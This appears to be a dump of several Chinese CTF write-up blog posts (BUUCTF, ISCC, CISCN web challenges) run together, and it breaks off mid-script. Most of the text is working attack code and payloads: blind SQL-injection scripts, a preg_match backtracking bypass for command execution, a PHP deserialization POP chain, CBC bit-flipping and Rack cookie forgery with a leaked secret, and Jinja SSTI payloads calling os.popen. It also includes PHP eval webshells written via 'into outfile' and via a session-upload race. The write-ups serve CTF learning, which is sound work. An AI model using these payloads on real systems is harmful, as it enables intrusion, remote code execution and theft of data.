database += chr(mid) print(database)print(database) 有个很无语的事，就是一旦请求多了，网页就会崩溃–，所以很痛苦 我还一直在想是出了什么问题了，就算把线程改为1也不行– 由于本题过滤了union 所以常规的无列名注入在这里就行不通了这里学习一下 无列名按位比较注入import requestss=requests.session()url=&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;payload=&quot;&quot;def trans(flag): res='' for i in flag: res+=hex(ord(i)) res='0x'+res.replace('0x','') return resflag=''for i in range(1,500): hexchar='' for char in range(32,126): hexchar = trans(flag+chr(char)) payload = '2||((select 1,{})&gt;(select * from f1ag_1s_h3r3_hhhhh))'.format(hexchar) data = { 'id': payload } r = requests.post(url=url, data=data) text = r.text if 'Nu1L' in r.text: flag += chr(char - 1) print(flag) break 1.说一下原理，这里是使用了一个比较的思想，先比第一位，如果第一位相等则比较第二位，在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大 2.所以这里需要两个循环，一个循环记录次数，一个循环放字符 无列名注入小结:无列名注入可能是之前都没小结过，每次都要翻一下记录:这里总结一下方便记忆的公式吧 select b from (select 1,2 as b,3 union select * from users)a; 虚拟列名 字段数 并且将要显示的 as b 表名 任意字母(select 1,爆破内容)&gt;(select * from 表名)","link":"/2021/06/05/buuctf17/"},{"title":"preg_replace函数绕过","text":"&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 今天利用这道题来整理一下preg_match的绕过姿势首先我们来看看preg_match的返回值有什么:1.返回12.返回03.返回false 设想一下，如果preg_match作为判断条件，用来匹配危险字符，如果匹配到则为1此时我们就被waf掉了，如果是返回错误以及0，这就意味着着我们绕过了！ 0篇接着，我们来看看有什么条件可以使我们匹配到0： 根据文档我们可以发现，如果没有s的话，匹配到换行符，preg_match就会停止匹配（preg_match尽力匹配第一行）利用点:如果此时在我们的语句前加入一个换行符，那么此时的我们语句将不会被匹配到，前提preg_match模式符中没有添加s。 payload: {&quot;cmd&quot;:&quot;%0A&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0A&quot;} false篇贪婪与非贪婪模式贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能多的匹配，也就是所谓的“贪婪”，通俗点讲，就是看到想要的，有多少就捡多少，除非再也没有想要的了。非贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。 贪婪模式：$str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src.*jpg/', $str, $match);var_dump($match); 输出结果: array(1) { [0]=&gt; string(28) &quot;src=&quot;mypic.jpg&quot;/&gt; , goog jpg&quot;} 因为是贪婪模式，所以这里多数除了一个jpg 非贪婪模式：$str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src=&quot;.*?\\.jpg&quot;/', $str, $match);var_dump($match); array(1) { [0] =&gt; string(15) &quot;src=&quot;mypic.jpg&quot;&quot;} 我们可以通过添加惰性限定符或修饰符进行处理 回溯由于是非贪婪模式，所以有回溯的概念的存在：举个例子 $str = 'this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha';preg_match('/src=&quot;.*?\\.jpg&quot;/', $str, $match);var_dump($match); 理解一下，大概是这个意思首先.？在这里匹配的是src和.jpg之间的内容，那么匹配的流程是这样的：首先.\\？匹配到“=”号，此时=号满足，放入备选录当中，接下来将匹配控制权交给jpg，发现这个=号不满足，于是回溯给.*？让它匹配了，所以最终结果就是src=”mypic.jpg” 次数限制回溯也不是想回多少次就回多少次， 在PHP中，正则匹配的递归次数由 pcre.backtrack_limit 控制 PHP5.3.7 版本之前默认值为 10万 ，PHP5.3.7 版本之后默认值为 100万 ，该值可以通过php.ini设置，也可以通过 phpinfo 页面查看。如上所示，当我们超过回溯次数，此时返回的就是false 演示：&lt;?php$data = '&lt;?php phpinfo();aaaaa'.str_repeat(' ',1000000);$a=preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data,$data1);print_r($a);print_r($data1); Array() 此时就匹配不到了脚本： import requestspayload = '{&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;' + &quot;a&quot;*(1000000) + '&quot;}'res = requests.post(&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;, data={&quot;cmd&quot;:payload})print(res.text) https://www.liuhaolin.com/php/195.htmlhttps://blog.csdn.net/phpfenghuo/article/details/17316645","link":"/2021/05/22/postpreg-replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/"},{"title":"ISCCweb题解","text":"前言：web的题大都做过类似的了，所以比较简单。。但是没想到难的题目都在杂项，开始后悔寒假没多学点杂项了。。。 web1——ISCC客服冲冲冲（一）F12审查元素，将对面那个客服的voting给删掉，然后它的票就不会增加了， web2——这是啥jsfuck代码，直接F12运行一下就能拿到FLAG web3——正则匹配&lt;?php&lt;p&gt;code.txt&lt;/p&gt;if (isset ($_GET['password'])) { if (preg_match (&quot;/^[a-zA-Z0-9]+$/&quot;, $_GET['password']) === FALSE) { echo '&lt;p&gt;You password must be alphanumeric&lt;/p&gt;'; } else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) { if (strpos ($_GET['password'], '*-*') !== FALSE) { die('Flag: ' . $flag); } else { echo('&lt;p&gt;*-* have not been found&lt;/p&gt;'); } } else { echo '&lt;p&gt;Invalid password&lt;/p&gt;'; }}?&gt; 源码如上，首先要字母和数字，然后有个位数限制，并且要数值需要大于9999999，采用科学技术法进行绕过payload: 6e8*-* web4——登录反序列化字符串逃逸就不说了 web5——which is the true iscc查看源码: &lt;?phpsession_start();ini_set('max_execution_time', '5');set_time_limit(5);$status = &quot;new&quot;;$cmd = &quot;whoami&quot;;$is_upload = false;$is_unser_finished = false;$iscc_file = NULL;class ISCC_Upload { function __wakeup() { global $cmd; global $is_upload; $cmd = &quot;whoami&quot;; $_SESSION['name'] = randstr(14); $is_upload = (count($_FILES) &gt; 0); } function __destruct() { global $is_upload; global $status; global $iscc_file; $status = &quot;upload_fail&quot;; if ($is_upload) { foreach ($_FILES as $key =&gt; $value) $GLOBALS[$key] = $value; if(is_uploaded_file($iscc_file['tmp_name'])) { $check = @getimagesize($iscc_file[&quot;tmp_name&quot;]); if($check !== false) { $target_dir = &quot;/var/tmp/&quot;; $target_file = $target_dir . randstr(10); if (file_exists($target_file)) { echo &quot;想啥呢？有东西了……&lt;br&gt;&quot;; finalize(); exit; } if ($iscc_file[&quot;size&quot;] &gt; 500000) { echo &quot;东西塞不进去~&lt;br&gt;&quot;; finalize(); exit; } if (move_uploaded_file($iscc_file[&quot;tmp_name&quot;], $target_file)) { echo &quot;我拿到了！&lt;br&gt;&quot;; $iscc_file = $target_file; $status = &quot;upload_ok&quot;; } else { echo &quot;拿不到:(&lt;br&gt;&quot;; finalize(); exit; } } else { finalize(); exit; } } else { echo &quot;你真是个天才!&lt;br&gt;&quot;; finalize(); exit; } } }}class ISCC_ResetCMD { protected $new_cmd = &quot;echo '新新世界，发号施令!'&quot;; function __wakeup() { global $cmd; global $is_upload; global $status; $_SESSION['name'] = randstr(14); $is_upload = false; if(!isset($this-&gt;new_cmd)) { $status = &quot;error&quot;; $error = &quot;你这罐子是空的!&quot;; throw new Exception($error); } if(!is_string($this-&gt;new_cmd)) { $status = &quot;error&quot;; $error = '东西都没给对!'; throw new Exception($error); } } function __destruct() { global $cmd; global $status; $status = &quot;reset&quot;; if($_SESSION['name'] === 'isccIsCciScc1scc') { $cmd = $this-&gt;new_cmd; } }}class ISCC_Login { function __wakeup() { $this-&gt;login(); } function __destruct() { $this-&gt;logout(); } function login() { $flag = file_get_contents(&quot;/flag&quot;); $pAssM0rd = hash(&quot;sha256&quot;, $flag); if($_GET['pAssM0rd'] === $pAssM0rd) $_SESSION['name'] = &quot;isccIsCciScc1scc&quot;; } function logout() { global $status; unset($_SESSION['name']); $status = &quot;finish&quot;; }}class ISCC_TellMeTruth { function __wakeup() { if(!isset($_SESSION['name'])) $_SESSION['name'] = randstr(14); echo &quot;似乎这个 &quot;.$_SESSION['name'].&quot; 是真相&lt;br&gt;&quot;; } function __destruct() { echo &quot;似乎这个 &quot;.$_SESSION['name'].&quot; 是真相&lt;br&gt;&quot;; }}class ISCC_Command { function __wakeup() { global $cmd; global $is_upload; $_SESSION['name'] = randstr(14); $is_upload = false; $cmd = &quot;whoami&quot;; } function __toString() { global $cmd; return &quot;看看你干的好事: {$cmd} &lt;br&gt;&quot;; } function __destruct() { global $cmd; global $status; global $is_unser_finished; $status = &quot;cmd&quot;; if($is_unser_finished === true) { echo &quot;看看你干的 [&lt;span style='color:red'&gt;{$cmd}&lt;/span&gt;] 弄出了什么后果: &quot;; echo &quot;&lt;span style='color:blue'&gt;&quot;; @system($cmd); echo &quot;&lt;/span&gt;&quot;; } }}function randstr($len){ $characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_='; $randstring = ''; for ($i = 0; $i &lt; $len; $i++) { $randstring .= $characters[rand(0, strlen($characters))]; } return $randstring;}function waf($s) { if(stripos($s, &quot;*&quot;) !== FALSE) return false; return true;}function finalize() { $cmd = &quot;&quot;; $is_upload = false; unset($_SESSION); @unlink($iscc_file); $status = &quot;finish&quot;; echo &quot;&lt;img src='whichisthetrueiscc.gif'&gt;&lt;br&gt;&quot;;}if(isset($_GET['whatareyounongshane'])) { $whatareyounongshane = $_GET['whatareyounongshane']; switch ($whatareyounongshane) { case &quot;src&quot;: highlight_file(__FILE__); break; case &quot;cmd&quot;: echo &quot;想越级干好事？还是有门的……&quot;; header('Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:{}'); break; case &quot;reset&quot;: echo &quot;几辈子积累的好运就在这时~:p&quot;; header('Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:{}'); break; case &quot;upload&quot;: $resp = &lt;&lt;&lt;EOF&lt;form action=&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:{}&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;iscc_file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;EOF; echo $resp; break; case &quot;tellmetruth&quot;: echo base64_decode(&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;); header('Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:{}'); break; default: echo &quot;空空如也就是我！&quot;; } finalize(); die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);}if(isset($_GET['?'])) { $wtf = waf($_GET{'?'}) ? $_GET['?'] : (finalize() &amp;&amp; die(&quot;试试就“逝世”!&quot;)); if($goodshit = @unserialize($wtf)) { $is_unser_finished = true; } if(in_array($status, array('new', 'cmd', 'upload_ok', 'upload_fail', 'reset'), true)) finalize(); die(&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;);}?&gt; 忘记保存了，重新复述一下吧审计完以后，可以知道我们的目的是执行system指令——》需要更改session[name]的值——》需要upload里面变量覆盖 难点:1.每个类的wakeup函数都重新定义了session[name]，调用每个类的时候，肯定会使用到wakeup，如果当我们的session[name]刚被赋值完iscc…..就被赋值回去了，那就没用了，所以我们需要进行绕过2.由于里面有protect变量，所以也需要绕过waf的过滤解决方案:1.wakeup的调用顺序是由内向外的，destruct的调用是由外向内的,所以我们以类似的嵌套方式（类似）来调用赋值，利用一个中间变量进行中转，这样及时最后用了wake_up函数也没事，因为我们已经执行完了2.可以利用大写S来绕过对protected,private等属性的字符检测，也就是将序列化过程中小写s改为大写s，这样后面的内容我们就可以用十六进制进行表示了 POP链构造: &lt;?phpclass ISCC_Upload{ public $x; public function __construct() { $this-&gt;x=new ISCC_ResetCMD(); }}class ISCC_ResetCMD{ public $x; protected $new_cmd='cat /flag'; function __construct(){ $this-&gt;x = new ISCC_Command; }}class ISCC_Command{}$b=new ISCC_Upload();$a=str_replace('s:10:&quot;'.&quot;\\x00*\\x00&quot;,'S:10:&quot;\\00\\2a\\00',serialize($b));echo urlencode ($a);//这个pop链的构造其实有点类似于嵌套，主要是为了绕过wakeup函数 https://github.com/ambionics/phpggc#advanced-enhancements web——擂台题-easyweb1'and%0dsubstr((select%0dgroup_concat),1,1)&gt;'0'--%0d union%0dselect%0d1,&quot;&lt;?php eval($_POST['cmd']);?&gt;&quot;%0dinto outfile%0d'/var/www/html/1.php' MySQL 5.6 及以上版本存在innodb_index_stats，innodb_table_stats两张表，其中包含新建立的库和表 select table_name from mysql.innodb_table_stats where database_name = database();select table_name from mysql.innodb_index_stats where database_name = database(); 在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名 //包含inSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();//不包含inSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();//通过表文件的存储路径获取表名SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE(); 包含之前查询记录的表 SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE(); SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE(); 包含之前查询记录的表 SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE(); 包含表文件路径的表 SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE(); 使用union select select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1select `3` from(select 1,2,3 union select * from admin)a limit 1,1//无逗号，有join版本select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x; 盲注 ((SELECT 1,concat('{result+chr(mid)}', cast(&quot;0&quot; as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`)) 要求后面select的结果必须是一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用hex或者binary。 这里只能使用concat将字符型和binary拼接，使之大小写敏感，JSON也可以使用char byte代替 mysql 8.0.19新增语句table https://dev.mysql.com/doc/refman/8.0/en/table.html TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]] 可以把table t简单理解成select * from t，和select的区别在于 table总是显示表的所有列 table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。 可以用来盲注表名 admin'and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)&gt;(BINARY('{}'),'0')# 同时代替select被过滤导致只能同表查询的问题 PS：新增的values语句也挺有意思，在某些情况似乎可以代替union或select进行order by盲注 学习链接:https://www.cnblogs.com/20175211lyz/p/12358725.html 解题过程一开始听说绝对路径var/www/html然后发现读取文件的权限很高，想说直接读读源码，发现不行，于是尝试尝试自己找找绝对路径:包含根目录路径的文件: /etc/apache2/sites-enabled/000-default.conf import requestsurl=&quot;http://39.96.91.106:5001/?id=&quot;s=requests.session()database=&quot;&quot;for i in range(1,10000): low =0 high=264 mid=(low+high)//2 while(low&lt;high): #payload_1=f&quot;1/**/and/**/ascii(substr(database(),{i},1))&gt;{mid}&quot; #payload_2=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='ctf'),{i},1))&gt;{mid}&quot; #payload_3=f&quot;1/**/and/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),{i},1))&gt;{mid}&quot; #payload_4= f&quot;1/**/and/**/ascii(substr((select/**/value/**/from/**/flag),{i},1))&gt;{mid}&quot; #payload_1=f&quot;1'and%0dascii(substr((selselectect%0dgroup_concat(table_name)%0dfrom%0dmysql.innodb_table_stats%0dwhere%0ddatabase_name%0d=database()),{i},1))&gt;{mid}--%0d&quot;//iscc_flag payload_3=f&quot;1'and%0dascii(substr((selselectect%0dload_file('/etc/apache2/sites-enabled/000-default.conf')),{i},1))&gt;{mid}--%0d&quot; payload_4 = f&quot;1'and%0dascii(substr((selselectect%0dload_file('/var/www/const')),{i},1))&gt;{mid}--%0d&quot; # print(s.get(url+payload_1).text) # print(payload_1) if &quot;Your Login name&quot; in s.get(url+payload_3).text: low = mid+1 else: high=mid mid=(low+high)//2 if(mid==0 or mid==264): break database +=chr(mid) print(database)print(database) web——ISCC客服一号冲冲冲（二）这题的考点在于CBC字节翻转攻击:思路：他让我们登录，但是没有窗口，所以这里我们就自己post一个username和password，然后再burp回文里看到一个iv，一个cipher，想到以前做过的CBC字节翻转攻击，接下来就没啥区别了，唯一的不同的是password是客服题第一题的flag，需要替换一下，这里就贴一下脚本，具体的可以去之前的文章找找： import base64import urllibcipher=&quot;iThCcXSm90cuwxnw1KtfJqk%2Bled1cE%2Ba3xQh7UfgNovfWzCFOGmuryqdECjX1RqcLNv7ybOCRfXJBbokBfS4oKc5MnoFTbBfn5zTFdthy3E%3D&quot;iv=&quot;dlp0Txccz%2Fba%2Fw0qSQGVjw%3D%3D&quot;cipher_de=base64.b64decode(urllib.unquote(cipher))tran='a:2:{s:8:&quot;username&quot;;s:5:&quot;bdmin&quot;;s:d&quot;;s:15:&quot;1SCC_2o2l_KeFuu&quot;}8:&quot;passwor'#tran[16:32]=me&quot;;s:5:&quot;bdmin&quot;;cipher_new=cipher_de[0:9]+chr(ord(cipher_de[9])^ord('b')^ord('a'))+cipher_de[10:]cipher_new=urllib.quote(base64.b64encode(cipher_new))print(cipher_new)cipher_new=base64.b64decode('GgadNOlPvXYl8SxK+NWkK21lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiIxU0NDXzJvMmxfS2VGdXUiO30=')print(cipher_new)iv_raw=base64.b64decode(urllib.unquote(iv))iv_new=''for i in range(0,16):# iv_new+=chr(ord(tran[i])^ord(iv_raw[i])^ord(cipher_new[i]))iv_new=urllib.quote(base64.b64encode(iv_new))print(iv_new) web——Explore Ruby一开始没注意到有提示说demo是可以登陆的，就在尝试伪造cookie（太菜了），然后登录后，发现存在ssti注入尝试了一下 发现是slim的ruby注入 #{7*7} 尝试读取继承，发现没有什么有用的内容，但是发现()等内容被过滤了，于是寻找替代品 [:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;=&gt;, :===, :=~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :==, :instance_exec, :!=, :__id__, :__send__] [:to_json, :instance_variable_set, :instance_variable_defined?, :remove_instance_variable, :instance_of?, :kind_of?, :is_a?, :tap, :instance_variable_get, :public_methods, :instance_variables, :method, :public_method, :define_singleton_method, :singleton_method, :public_send, :extend, :to_enum, :enum_for, :pp, :gem, :&lt;=&gt;, :===, :=~, :!~, :eql?, :respond_to?, :freeze, :inspect, :object_id, :send, :to_s, :display, :nil?, :hash, :class, :singleton_class, :clone, :dup, :yield_self, :itself, :tainted?, :taint, :untrust, :untaint, :trust, :untrusted?, :methods, :frozen?, :singleton_methods, :protected_methods, :private_methods, :!, :equal?, :instance_eval, :==, :instance_exec, :!=, :__id__, :__send__] object:47312658352300 以上均为类继承读到的无用信息，发现几篇文章:https://blog.csdn.net/watkinsong/article/details/7968550https://www.huaweicloud.com/articles/b5b475ca729307885cd91f03c46d4826.html 其中让人感兴趣的就是%x可以执行shell命令：虽然中括号被过滤，但是https://qastack.cn/programming/665576/what-are-those-pipe-symbols-for-in-ruby 可以利用管道符||进行绕过，构造payload: #{%x|ls|}//执行了系统命令 #GemfileGemfile.lockdatabase.dbpublicvendorviewswebserver.rb} 使用cat命令即可查看源码： configure do set :public_folder, 'public' set :views, 'views' set :bind, '0.0.0.0' set :port, 9999 enable :sessions set :server, %w[thin webrick] set :environment, :production #set :environment, :development #disable :protection set :session_secret, '01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85'end get '/home' do authenticate! @user = session[:username] @flag = ENV['FLAG'] if session[:role] == 'admin' slim :homeend 关键在这里，所以我们需要伪造admin cookie require &quot;net/http&quot;require &quot;uri&quot;require 'pp'require 'base64'require 'digest/sha1'require 'faraday'# Remote hostdef generate_hmac(data, secret) OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)end# URL = &quot;http://39.96.91.106:8230/login&quot;# # Create URL object# url = URI.parse(URL) # creds = &quot;demo&quot;# c = &quot;&quot;# # Authentication# resp = Net::HTTP.start(url.host, url.port) do |http|# http.post(url.request_uri, &quot;username=#{creds}&amp;password=#{creds}&quot;)# endCookies = &quot;BAh7CkkiDXVzZXJuYW1lBjoGRUZJIglkZW1vBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTAyMjU1OTdiMjJhYWM4Zjc3%0AYjcxZGUwNzQ2MjBlM2JiN2E5NDA1ODlmOWJjOTg5NWNiMTU3YzBlYTgyZGI5%0AYzIGOwBGSSIJY3NyZgY7AEZJIjF4MDlxTHVlOXdOZjNFWGx3T2ZzWjVXYlZ1%0ANEU5dnhBdW04TTk0Q3JZM1EwPQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU%0AVFBfVVNFUl9BR0VOVAY7AFRJIi00ZTRhYWEyYmFhZmVjYmIxYjcwOTViZWQ2%0AZDZmZWYzMmM3ZWI4NzEwBjsARg%3D%3D%0A--957bdf7dc19049010fd0b19e4d8656c42314b2db&quot;# puts get the cookiecookie, signature = Cookies.split(&quot;--&quot;,2)cookie = URI.decode(cookie)decoded = Base64.decode64(URI.decode(cookie))params = Marshal.load(decoded)params.merge!({ 'role' =&gt;&quot;admin&quot;})print(params)bad_cookie = URI.encode(Base64.encode64(Marshal.dump(params)))bad_hmac = generate_hmac(bad_cookie, &quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;)header = &quot;rack.session=#{bad_cookie}--#{bad_hmac};&quot;print(header) 贴一下学长写的 在kali ruby环境下跑一下！注意，需要去题目的第二个入口伪造cookie才行！！！！！！ 接下来就可以拿到flag了 LOVE-SSTI：一开始的脑洞很烦，暹罗猫那个表情包有个别名 叫小豆泥，所以注入点是?xiaodouni= 接下来就是常规的ssti注入了，主要是去__doc__里面取字符，由于要查找flag，所以需要一个号，但是没找到\\，写了个脚本要找*号，但是网站似乎不让爆破==就很难受， import requestsurl=&quot;http://39.96.91.106:3010/?xiaodouni=&quot;s=requests.session()headers=requests.session().headerspayload=&quot;{%set%20a=dict(op=x,p=x)|join()%}{%set%20b=(()|select|string|list)|attr(a)(24)%}{%set%20c=(b,b,dict(doc=a)|join,b,b)|join%}{%set%20g=(x|attr(c)|list)|&quot;for i in range(0,10000): payload_fi=payload+f&quot;attr(a)({i})%&quot;+&quot;}{{g}}&quot; url_f=url+payload_fi print(s.get(url=url_f,headers=headers).text) if &quot;*&quot; in s.get(url=url_f,headers=headers).text: print(i) break 所以就去找了一下其他方法。payload如下 {%set a=dict(op=x,p=x)|join()%}{%set b=(()|select|string|list)|attr(a)(24)%}{%set c=(b,b,dict(doc=a)|join,b,b)|join%}{%set g=(x|attr(c)|list)|attr(a)(320)%}{%set gl=(b,b,dict(globals=a)|join,b,b)|join%}{%set bu=(b,b,dict(builtins=a)|join,b,b)|join%}{% set cr=(lipsum|attr(gl)|attr(&quot;get&quot;)(bu))[&quot;ch&quot;&quot;r&quot;] %}{%set d=cr(42)%}{% set or=(&quot;find / -name &quot;,d,&quot;fla&quot;,d)|join%}{% set or1 = &quot;cat /usr/fla??is?here?txt&quot;%}{{(lipsum|attr(gl)|attr(&quot;get&quot;)(&quot;o&quot;&quot;s&quot;)|attr(&quot;po&quot;&quot;pen&quot;)(or1))|attr(&quot;read&quot;)()}} 小结：至此 web的所有题目都ak。学到了很多~","link":"/2021/05/02/ISCCweb%E9%A2%98%E8%A7%A3/"},{"title":"CISCN web","text":"easy_sql输入信息 会报错 根据报错信息 sql注入 需要用’)绕过闭合 因为有报错，尝试报错注入: payload: 1')and extractvalue(1,concat('~',(select * from (select * from flag as a join flag b)c)))# 这里的库又禁用了，想起来上次就是直接猜表名为flag于是 尝试payload: 1')and extractvalue(1,concat('~',(select 1 from flag)))#1')and extractvalue(1,concat('~',(select aaa from fla)))#通过回显可以发现表名果然为flag 1')and extractvalue(1,concat('~',(select * from (select * from flag as a join flag b using(id,no))c)))# 获得列名 1')and extractvalue(1,concat('~',(select `87ed65c7-b43b-4438-a4b7-eed85ab78d4b` from flag)))# 需要substr截取： 参考文章:https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/ easy_source看看备份目录 .index.php.swo &lt;?phpclass User{ private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; } }$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); 找到源码，发现是php反射问题 反射类中存在两个参数的就是ReflectionMethod() 和题目吗一毛一样接下来就看要运用哪个函数了: $method=new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment)rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment//有个坑 他的flag是藏在其中一个方法的注释当中的，需要遍历一下！rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment PHP手册:https://www.php.net/manual/zh/class.reflectionmethod.php middle_source一开始扫描目录，获得you_can_seeeeeeee_me.php 发现是phpinfo的配置文件 ../../../../../../../../../../var/lib/php/sessions/fjjefccdjd 看到很奇怪的session目录——&gt;考点文件包含+利用session进行文件上传（条件竞争） import ioimport requestsimport threadingimport timesessid = 'TGAO'data = {&quot;cmd&quot;:&quot;var_dump(scandir('/etc/gcbcgffhac/egdcbahfbh/dedhfgiaai/dajfeeacie/aeebhaaejd/fl444444g'));&quot;,&quot;cf&quot;:&quot;../../../var/lib/php/sessions/fjjefccdjd/sess_&quot;+sessid}def write(session): while True: f = io.BytesIO(b'a' * 1024 * 50) resp = session.post( 'http://124.70.0.162:24693', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session): while True: resp = 